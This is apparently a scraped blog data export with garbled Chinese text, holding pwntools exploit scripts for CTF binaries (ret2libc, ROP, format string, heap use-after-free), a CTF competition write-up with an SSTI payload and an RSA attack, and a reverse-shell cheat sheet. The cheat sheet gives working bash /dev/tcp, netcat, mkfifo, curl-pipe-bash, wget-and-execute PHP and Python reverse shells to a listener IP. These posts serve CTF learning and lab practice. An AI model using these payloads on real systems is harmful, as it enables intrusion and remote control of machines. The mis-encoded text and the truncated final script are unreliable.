process(\"./ret2libc1\")system_plt = elf.plt[\"system\"]bin_sh = next(elf.search(b\"/bin/sh\"))payload = b'A'*0x70 + p32(system_plt) + b'BBBB' + p32(bin_sh)io.sendline(payload)io.interactive() ret2libc2æ ˆæº¢å‡º æ— /bin/shå­—ç¬¦ä¸²ï¼Œä½†bssæ®µå¯å†™ ç¬¬ä¸€ç§ 123456789101112from pwn import *io = process(\"./ret2libc2\")elf = ELF(\"./ret2libc2\")system_plt = elf.plt[\"system\"]gets_plt = elf.plt[\"gets\"]bss = 0x804a080payload = b'A'*0x70 + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)io.sendline(payload)io.sendline(b\"/bin/sh\\x00\")io.interactive() ç¬¬äºŒç§ 12345678910111213from pwn import *io = process(\"./ret2libc2\")elf = ELF(\"./ret2libc2\")system_plt = elf.plt[\"system\"]gets_plt = elf.plt[\"gets\"]bss = 0x804a080pop_ebx_ret = 0x804843dpayload = b'A'*0x70 + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)io.sendline(payload)io.sendline(b\"/bin/bash\\x00\")io.interactive() retlibc3æ ˆå˜é‡çš„ç»“æ„ æ ˆçš„ç»“æ„ æ³„éœ²libc åº”è¯¥æ˜¯libcä¸åŒå¯¼è‡´æ‰“ä¸é€š 12345678910111213141516from pwn import *io = process(\"./ret2libc3\")elf = ELF(\"./ret2libc3\")libc = ELF(\"libc-2.23.so\")put = elf.got[\"puts\"]puts = libc.symbols[\"puts\"]system = libc.symbols[\"system\"]io.sendlineafter(b\" :\",str(put))io.recvuntil(b\" : \")libcbase = int(io.recvuntil(b\"\\n\",drop = True),16) - putspayload = flat( cyclic(60), libcbase + system , 0xdeadbeef ,next(elf.search(b\"sh\\x00\")))io.sendlineafter(b\" :\",payload)io.interactive() pwn2_x64æ ˆå›¾ pwn3 é€šè¿‡libcæ³„éœ²ç³»ç»Ÿå‡½æ•°ï¼Œé¦–å…ˆè·å¾—åŸºåœ°å€å¯ä»¥é€šè¿‡ä»¥ä¸‹æ¥æ³„éœ²ï¼ˆ1ï¼‰é€šè¿‡ROPç³»ç»Ÿè°ƒç”¨ï¼ˆ2ï¼‰ç›´æ¥å‡½æ•°writeæ³„éœ² æ— sh ï¼ˆ1ï¼‰ç¬¦å·æœ‰æ— sh ï¼ˆ2ï¼‰é€šè¿‡ROPå°†/bin/shå†™å…¥ ï¼ˆ3ï¼‰libcä¸­/bin/sh 12345678910111213141516171819202122232425from pwn import *io = process(\"./level3\")libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")elf = ELF(\"./level3\")vulfun_addr = 0x0804844B write_plt = elf.symbols[\"write\"]write_got = elf.got[\"write\"]payload1 = cyclic(0x88+4) + p32(write_plt) + p32(vulfun_addr) + p32(1) + p32(write_got) + p32(4)io.recvuntil(b\"Input:\\n\")io.sendline(payload1)write_addr = u32(io.recv(4)) #Specify four byteslibc_base = write_addr - libc.symbols[\"write\"]system_addr = libc.symbols[\"system\"] + libc_basesh_addr = libc_base + next(libc.search(b\"/bin/sh\"))#libc_write=libc.symbols['write']#libc_system=libc.symbols['system']#libc_sh=next(libc.search(b'/bin/sh'))#system_addr=write_addr-libc_write+libc_system #sh_addr=write_addr-libc_write+libc_shpayload2 = cyclic(0x88+4) + p32(system_addr) + b'A'*4 + p32(sh_addr)io.sendline(payload2)io.interactive() pwn3_x64ä¸¤æ¬¡ROP 1234567891011121314151617181920212223from pwn import * #context.log_level=\"debug\" elf=ELF(\"level3_x64\") write_plt=elf.symbols[\"write\"] write_got=elf.got[\"write\"] vul_addr=elf.symbols['vulnerable_function']p = process(\"./level3_x64\")#p=remote(\"47.116.107.8\",9883) p.recvuntil(b\"Input:\\n\") pop_rdi_addr=0x00000000004006b3 #0x00000000004006b3 : pop rdi ; retpop_rsi_r15_addr=0x00000000004006b1 #0x00000000004006b1 : pop rsi ; pop r15 ; retpayload1 = cyclic(0x80+8) + p64(pop_rdi_addr) + p64(1) + p64(pop_rsi_r15_addr) + p64(write_got) + p64('deadbeef') + p64(write_plt) + p64(vul_addr) p.sendline(payload1) t=p.recv(8)write_addr=u64(t[0:8]) libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") offset=write_addr-libc.symbols[\"write\"] sys_addr=offset+libc.symbols[\"system\"] bin_addr=offset+next(libc.search(b\"/bin/sh\"))payload2 = cyclic(0x80+8) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)p.sendline(payload2) p.interactive() æ ¼å¼åŒ–å­—ç¬¦ä¸²fmtstr1è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ æ€è·¯ï¼šå°†xçš„åœ°å€æ”¾åˆ°æ ˆä¸Šï¼Œå¯¹åº”çš„è·å–æ ˆä¸Šçš„åœ°å€ç›¸å¯¹äºprintfçš„ç¬¬å‡ ä¸ªå‚æ•° 12345678from pwn import * conn=process('./fmtstr1')e=ELF('./fmtstr1')x_addr=0x0804A02C payload=p32(x_addr) + b\"%11$n\"conn.sendline(payload)conn.interactive() fmstr2è¿™é¢˜å¾ˆå¥‡æ€ª X64 æ„Ÿè§‰æ˜¯çˆ†ç ´å‡ºæ¥çš„ 1%9$s fmstr_uafRWXæ‰“å¼€ï¼Œè¯´æ˜åº”è¯¥æ˜¯è¿”å›shellcode ä¹Ÿå°±æ˜¯æ ˆä¸Šå†™shellcode æ­¤å¤–ï¼Œè¿˜éœ€è¦åˆ©ç”¨å †è¿›è¡ŒUAF è¿›è¡Œshellcodeçš„è°ƒç”¨ åŒæ—¶è¿˜æœ‰fmstræ³„éœ²mainâ€™rbpçš„ä½ç½® 123456789101112131415161718192021222324252627from pwn import *p=process(\"./echo2\")elf=ELF(\"./echo2\")p.recvuntil(\"hey, what's your name? : \")shellcode=b\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"p.sendline(shellcode)p.recvuntil(b\"&gt; \")p.sendline(b\"2\")payload=b\"%10$p\"+b\"A\"*3p.sendline(payload)p.recvuntil(b\"0x\")shellcode_addr=int(p.recvuntil(b'AAA',drop=True),16)-0x20p.recvuntil(b\"&gt; \")p.sendline(b\"4\")p.recvuntil(b\"to exit? (y/n)\")p.sendline(b\"n\")p.recvuntil(b\"&gt; \")p.sendline(b\"3\")p.recvuntil(b\"hello \\n\")p.sendline(b\"A\"*24+p64(shellcode_addr))p.interactive() å †heap1 é¦–å…ˆéœ€è¦æä¸¤ä¸ªchunk(8byte)ï¼Œfreeåï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬fastbinä¸­å°±ä¼šæœ‰ä¸¤ä¸ª8byteçš„chunk ä¹‹åæˆ‘ä»¬åœ¨åˆ†é…1ä¸ªchunkï¼Œç”±äºfastbinçš„ç¼˜æ•… æˆ‘ä»¬å°±ä¼šæŠŠptr[1]ä¸­çš„chunkç›´æ¥æ‹¿è¿‡æ¥ å¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶content sizeä¸º8 æˆ‘ä»¬ä¹Ÿå°±æŠŠptr[0]ä¸­çš„chunkæ‹¿äº†è¿‡æ¥ ä»è€Œè¾¾åˆ°äº†UAF 12345(*ptr[v1])(ptr[v1]);int self_puts(int a1)&#123; return puts(*(a1 + 4));&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import * p = remote(\"chall.pwnable.tw\",10102)#p=process(\"./hacknote\")elf = ELF(\"./hacknote\")libc = ELF(\"./libc_32.so.6\")read_got = elf.got[\"read\"]pfputs = 0x804862b def add_note(size,index): p.recvuntil(b\"choice :\") p.sendline(b\"1\") p.recvuntil(b\"size :\") p.sendline(size) p.recvuntil(b\"Content :\") p.sendline(index) def delete_note(index): p.recvuntil(b\"choice :\") p.sendline(b\"2\") p.recvuntil(b\"Index :\") p.sendline(index) def print_note(index): p.recvuntil(b\"choice :\") p.sendline(b\"3\") p.recvuntil(b\"Index :\") p.sendline(index)#p.interactive()add_note(b\"16\",b\"aaaaa\")add_note(b\"16\",b\"aaaaa\")delete_note(b'0')delete_note(b'1')add_note(b'8',p32(pfputs)+p32(read_got))print_note(b'0')pfread = u32(p.recv()[0:4])pfsys = pfread - 0xd41c0 + 0x3a940#p.interactive()delete_note(b'2')#p.interactive()#p.recv()#p.interactive()add_note(b'8',p32(pfsys)+b\"||sh\")print_note(b'0')p.interactive() â€‹","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"CUMT2020åä¸ºæ¯","slug":"CUMT2020åä¸ºæ¯","date":"2020-10-24T09:53:38.000Z","updated":"2020-11-20T14:18:17.449Z","comments":true,"path":"2020/10/24/CUMT2020åä¸ºæ¯/","link":"","permalink":"https://pz1o.top/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/","excerpt":"","text":"CUMTåä¸ºæ¯webç‹—æ´»æˆäº†å„æ–¹å‘ç­¾åˆ°æ‰‹â€¦ webbabyflaskæ¨¡æ¿æ³¨å…¥ 1&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125; dogef12æ‘‡å¥–å¾—flag rehello_worldå¼‚æˆ– 1234567891011121314d=[]b = \"is_easy_right?\"a = ['2A', '26', '12', '31', '1A', '7', '11', '3A', '2D', '0F', '0E','1A', '41', '4B', '36', '43', '31', '0', '3E', '16', '17', '35','1D', '10', '38', '11', '44', '4A', '1B', '2C', '2B', '17','50','3', '4']for x in a: c = '' z = x c += '0x' c +=z d.append(c)d = 0for i in range(0,35): c = int(a[i],16) m = i%14 print(chr(ord((b[m]))^c),end='') non_nameå››å…ƒä¸€æ¬¡æ–¹ç¨‹ 12345678b = [12, 32, 34, 12, 53, 1, 2, 4, 6, 8, 34, 45, 56, 32, 85, 43]c = ['a','b','c','d']for i in range(0,4): sum1 = 0 for j in range(0,4): print(\"%s*%s\"%(b[i*4+j],c[j]),end='+') print('\\n')#116 103 102 114 cryptoClassicalç»´å‰å°¼äºšå¯†ç ï¼Œä¸Šç½‘downè„šæœ¬ï¼ŒçŒœå¯†é’¥ï¼Œè·‘å‡ºæ¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455cipher = \"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikzâ€™wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izrâ€™m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csgâ€™v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn.\"# coding: utf-8def encrypt(message, key): cipher = '' j = 0 for i in range(len(message)): if key[j % len(key)].islower(): offset = ord(key[j % len(key)]) - ord('a') else: if key[j % len(key)].isupper(): offset = ord(key[j % len(key)]) - ord('A') else: offset = ord(key[j % len(key)]) - 48 j += 1 if message[i].isalpha(): if message[i].islower(): cipher += chr((ord(message[i]) - ord('a') + offset) % 26 + ord('a')) else: cipher += chr((ord(message[i]) - ord('A') + offset) % 26 + ord('A')) else: cipher += message[i] j -= 1 return cipherdef decrypt(cipher, key): explain = '' j = 0 for i in range(len(cipher)): if key[j % len(key)].islower(): offset = ord(key[j % len(key)]) - ord('a') else: if key[j % len(key)].isupper(): offset = ord(key[j % len(key)]) - ord('A') else: offset = ord(key[j % len(key)]) - 48 j += 1 if cipher[i].isalpha(): if cipher[i].islower(): explain += chr((ord(cipher[i]) - ord('a') - offset) % 26 + ord('a')) else: explain += chr((ord(cipher[i]) - ord('A') - offset) % 26 + ord('A')) else: explain += cipher[i] j -= 1 return explainprint(decrypt(cipher,'Lethelastctf'))CUMTCTF&#123;EnjoyTheVigenereCipher&#125; ezRSAå¤§æ•°e å¯ä»¥åˆ¤æ–­æ˜¯wiener attack ä¸Šç½‘ç›´æ¥downè„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&#39;&#39;&#39;Created on Dec 14, 2011@author: pablocelayes&#39;&#39;&#39;import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratordef hack_RSA(e,n): &#39;&#39;&#39; Finds d knowing (e,n) applying the Wiener continued fraction attack &#39;&#39;&#39; frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n) convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0: phi &#x3D; (e*d-1)&#x2F;&#x2F;k s &#x3D; n - phi + 1 # check if the equation x^2 - s*x + n &#x3D; 0 # has integer roots discr &#x3D; s*s - 4*n if(discr&gt;&#x3D;0): t &#x3D; Arithmetic.is_perfect_square(discr) if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0: print(&quot;Hacked!&quot;) return d# TEST functionsdef test_hack_RSA(): print(&quot;Testing Wiener Attack&quot;) times &#x3D; 5 while(times&gt;0): e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024) print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;) print(&quot;d &#x3D; &quot;, d) hacked_d &#x3D; hack_RSA(e, n) if d &#x3D;&#x3D; hacked_d: print(&quot;Hack WORKED!&quot;) else: print(&quot;Hack FAILED&quot;) print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d) print(&quot;-------------------------&quot;) times -&#x3D; 1 if __name__ &#x3D;&#x3D; &quot;__main__&quot;: n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151 #test_is_perfect_square() d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895 m &#x3D; pow(c,d,n) def num2str(num): tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;) if(len(tmp))%2 &#x3D;&#x3D;0: return tmp.decode(&quot;hex&quot;) else: return (&quot;0&quot;+tmp).decode(&quot;hex&quot;) print(num2str(m)) #print(&quot;-------------------------&quot;) #print(hack_RSA(e,n))CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125; miscSign Inè½¬base64åœ¨è½¬brainfk 1CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125; å‡ºä¸ªæµé‡åˆ†æå§httpæµbase64è§£ç  1flag&#123;WirRSharK_S0_E45y&#125; å‡ºä¸ªLSBå§LSBéšå†™ red green blue 0 0 0 ä¿å­˜å¾—äºŒç»´ç  æ‰«å¾—flag 1cumtctf&#123;1sb_i4_s0_Ea4y&#125; å‡ºä¸ªä¼ªwebå§æŸ¥çœ‹æœ€æ–°ä¿®æ”¹æ–‡ä»¶çš„æ—¶é—´ å¯ä»¥çœ‹åˆ°passä¸­æœ‰æ˜æ˜¾å­—ç¬¦ä¸²cumt ç„¶åæ‹¿flagåŒ…è£¹å°±è¡Œ å‡ºä¸ªæ–‡æ¡£å§éšè—æ–‡å­— å†…å­˜å–è¯12python vol.py -f memory.img imageinfopython vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag å¯ä»¥çœ‹åˆ°æœ‰flag.pngï¼Œè¾“å‡ºä¸€ä¸‹ 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900 å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå›¾ç‰‡æ‰«ä¸€ä¸‹ 1jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D; è§£ä¸å‡ºæ¥ æŸ¥çœ‹ç³»ç»Ÿçª—å£åˆ—è¡¨ï¼Œçœ‹æœ‰æ²¡æœ‰å’Œflagæœ‰å…³çš„ç¨‹åº 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç¨‹åºdumpä¸€ä¸‹ 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992 ç”¨foremoståˆ†ç¦»ä¸€ä¸‹ å¯ä»¥çœ‹åˆ°æœ‰å›¾ç‰‡ æœ‰keyå€¼å’Œvi ç„¶åå°±æ˜¯AESåŠ å¯† 12345key:Th1s_1s_K3y00000vi:1234567890123456base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125; å‡ºä¸ªå‹ç¼©åŒ…å§010æ‰“å¼€ä¹‹åå‘ç°æœ‰secret.pngæ²¡æœ‰ä¼ªåŠ å¯†ï¼Œå¾ˆæ˜æ˜¾å­å—è¢«ä¿®æ”¹ 7aæ”¹æˆ74 åˆ†ç¦»å‡ºsecret.png å‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œä½†æœ‰ä¸¤å¸§ è„±åˆ°stegé‡Œé¢å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ®‹ç¼ºçš„äºŒç»´ç  è¡¥å…¨ï¼Œå°±å¯ä»¥çœ‹åˆ°flag 1flag&#123;yanji4n_bu_we1shi&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"é¢˜è§£","slug":"é¢˜è§£","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"åå¼¹shellæ€»ç»“","slug":"åå¼¹shellæ€»ç»“","date":"2020-10-03T05:45:01.000Z","updated":"2020-11-20T14:19:35.452Z","comments":true,"path":"2020/10/03/åå¼¹shellæ€»ç»“/","link":"","permalink":"https://pz1o.top/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/","excerpt":"","text":"å‰è¨€æœ€è¿‘é‡åˆ°åå¼¹shellï¼Œæ€»ç»“ä¸€ä¸‹åå¼¹shellï¼Œç”¨æ¥åšç¬”è®° åå¼¹shellåå‘ShellæŒ‡Shellå›å¼¹æˆ–è€…å«åå°„ï¼Œå°±æ˜¯è¯´å—å®³è€…kaliæŠŠè‡ªå·±çš„ShellæŒ‚è½½ï¼ˆæˆ–è€…å«attachæ›´åˆé€‚ï¼‰åˆ°æŸä¸ªç«¯å£ä¸Šï¼Œä»¥æ­¤æš´éœ²åˆ°æ”»å‡»è€…winå¯ä»¥è¿æ¥çš„ä½ç½®ï¼Œæ”»å‡»è€…winé€šè¿‡è¿æ¥è¯¥ç«¯å£æœ€ç»ˆæ‹¿åˆ°shellã€‚ ä»¥ä¸‹å®éªŒéƒ½ä¸º kaliä¸ºè¢«æ”»å‡»è€…æ¥æ¨¡ä»¿æœåŠ¡å™¨ winä¸ºæ”»å‡»è€… kaliï¼ˆæœåŠ¡ç«¯ï¼‰ï¼š192.168.202.129 winï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼š169.254.158.23 bashåå¼¹shell1bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1 bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒè®©æœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸ç›®æ ‡ä¸»æœº8080ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 8080 ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªtcp 8080ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªbash åå¼¹ç¯å¢ƒã€‚ å®éªŒé¦–å…ˆåœ¨winä¸Šç›‘å¬8080ç«¯å£ 1nc -nvlp 8080 -n: ä¸åå‘è§£ædnsï¼Œå³ä¸é€šè¿‡ipè§£æåŸŸå no dns -v: è¯¦ç»†ä¿¡æ¯è¾“å‡º verbose -l: ç›‘å¬ listen -p: æŒ‡å®šç«¯å£ port ç„¶åå†kaliä¸Šè¿è¡Œ 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1 ä¹‹ååå¼¹æˆåŠŸ è§£é‡Šå…·ä½“å„å‚æ•°çš„æ„ä¹‰ linuxæ–‡ä»¶æè¿°ç¬¦ 1230 - stdin ä»£è¡¨æ ‡å‡†è¾“å…¥,ä½¿ç”¨&lt;æˆ–&lt;&lt;1 - stdout ä»£è¡¨æ ‡å‡†è¾“å‡º,ä½¿ç”¨&gt;æˆ–&gt;&gt;2 - stderr ä»£è¡¨æ ‡å‡†é”™è¯¯è¾“å‡º,ä½¿ç”¨2&gt;æˆ–2&gt;&gt; >&amp; 1234567891011å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æ—¶ï¼Œè¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘è‡³æ–‡ä»¶ã€‚å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œè¡¨ç¤ºå°†å‰é¢çš„æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘è‡³åé¢çš„æ–‡ä»¶æè¿°ç¬¦&gt;&amp;å’Œ&gt;çš„åŒºåˆ«root@kali:/var/www/html# ls //æŸ¥çœ‹æ— 1.phpflag.php index.phproot@kali:/var/www/html# cat 1.php 2&gt;1 //å°†é”™è¯¯å†…å®¹è¾“å…¥åˆ°1æ–‡ä»¶ä¸­root@kali:/var/www/html# cat 1cat: 1.php: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•root@kali:/var/www/html# cat 1.php 2&gt;&amp;1 //å°†é”™è¯¯å†…å®¹æŒ‰æ ‡å‡†è¾“å‡ºå‡ºæ¥cat: 1.php: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• bash -i äº§ç”Ÿä¸€ä¸ªbashç¯å¢ƒ /dev/tcp/ip/portï¼š /dev/tcp/æ˜¯Linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œ&gt;&amp;åé¢è·Ÿä¸Š/dev/tcp/ip/portè¿™ä¸ªæ–‡ä»¶ä»£è¡¨å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¼ é€’åˆ°è¿œç¨‹ä¸Šï¼Œå¦‚æœè¿œç¨‹å¼€å¯äº†å¯¹åº”çš„ç«¯å£å»ç›‘å¬ï¼Œå°±ä¼šæ¥æ”¶åˆ°è¿™ä¸ªbashçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚ 0&gt;&amp;1ï¼Œä»£è¡¨å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œè¿™é‡Œçš„æ ‡å‡†è¾“å‡ºå·²ç»é‡å®šå‘åˆ°äº†/dev/tcp/ip/portè¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹ï¼Œé‚£ä¹ˆæ ‡å‡†è¾“å…¥ä¹Ÿå°±é‡å®šå‘åˆ°äº†è¿œç¨‹ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥åœ¨è¿œç¨‹è¾“å…¥äº† ncä¸€å¥è¯åå¼¹1nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash -e: æŒ‡å®šncè¿æ¥æˆåŠŸåæ‰§è¡Œçš„ç¨‹åº æ— -eçš„æƒ…å†µä¸‹å¯ä»¥æ‰§è¡Œ 1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f; å®éªŒ1é¦–å…ˆåœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬7777ç«¯å£ 1nc -nvlp 7777 ç„¶ååœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šä¸€å¥è¯åå¼¹ 1nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash åå¼¹æˆåŠŸ å®éªŒ2winä¸Šç›‘å¬ç«¯å£ 1nc -nvlp 7777 kaliä¸Šæ‰§è¡Œ 1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f; åå¼¹æˆåŠŸ curlåå¼¹å‰æè¦åˆ©ç”¨bashä¸€å¥è¯çš„æƒ…å†µä¸‹ä½¿ç”¨curlåå¼¹shell kaliä¸Šindexæ–‡ä»¶ä¸Šå«æœ‰bashä¸€å¥è¯ï¼Œå°±å¯ä»¥åå¼¹shellã€‚ å®éªŒkaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šæ£€æŸ¥æ˜¯å¦æœ‰bashä¸€å¥è¯ 123curl 192.168.202.129bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1 åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬ç«¯å£ 1nc -nvlp 7777 åˆ©ç”¨æœåŠ¡ç«¯curlåå¼¹ 1curl 192.168.202.129|bash åå¼¹æˆåŠŸ wgetåå¼¹å…¶å®æ˜¯åˆ©ç”¨wgetå’Œphpè„šæœ¬ä¸€å—æ‰§è¡Œè¾¾åˆ°åå¼¹ å®éªŒé¦–å…ˆåœ¨winï¼ˆåº”è¯¥åœ¨ä»»ä½•ä¸€å°æœåŠ¡å™¨ä¸Šä¹Ÿè¡Œï¼‰ä¸Šæœ‰shell.txtï¼Œå†™å…¥ä»¥ä¸‹phpå†…å®¹ 1234&lt;?php$sock=fsockopen(\"localhost\",12345);//localhostä¸ºè‡ªå·±çš„ipexec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; å…ˆåœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬ 1nc -nvlp 7777 åœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šåˆ©ç”¨wgetä¸‹è½½shell.txtï¼Œç„¶åæ‰§è¡Œphp 1wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php åå¼¹æˆåŠŸ pythonåå¼¹åˆ©ç”¨curl ä½†è¿™æ¬¡ç”¨çš„æ˜¯pyè„šæœ¬ 123456789#!/usr/bin/python#-*- coding: utf-8 -*-import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"169.254.158.23\",7777)) 